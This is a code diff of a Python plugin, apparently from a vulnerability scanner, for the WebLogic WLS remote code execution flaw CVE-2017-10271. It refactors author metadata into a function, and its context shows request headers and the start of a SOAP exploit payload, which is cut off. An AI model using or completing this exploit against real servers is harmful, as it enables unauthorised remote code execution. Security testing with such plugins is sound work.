@@ -5,10 +5,6 @@ import requests
 
 description = 'WebLogic Server WLS RCE(CVE-2017-10271)'
 """
-    Script : weblogic-wls.py
-    Author : starnight_cyber
-    Time : 2018.1.8
-
     WebLogic Server WLS RCE (CVE-2017-10271):
         OracleWebLogic Server 10.3.6.0.0
         OracleWebLogic Server 12.1.3.0.0
@@ -16,11 +12,27 @@ description = 'WebLogic Server WLS RCE(CVE-2017-10271)'
         OracleWebLogic Server 12.2.1.2.0
 """
 
+
+def get_plugin_info():
+    """
+    插件描述信息
+    :return: plugin_info
+    """
+    plugin_info = {
+        "name": "weblogic-wls.py",
+        "author": "starnight_cyber",
+        "cve_no": "CVE-2017-10271",
+        "description": description,
+    }
+    return plugin_info
+
+
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
     "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
     "Content-Type": "text/xml"
 }
+
 
 payload = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
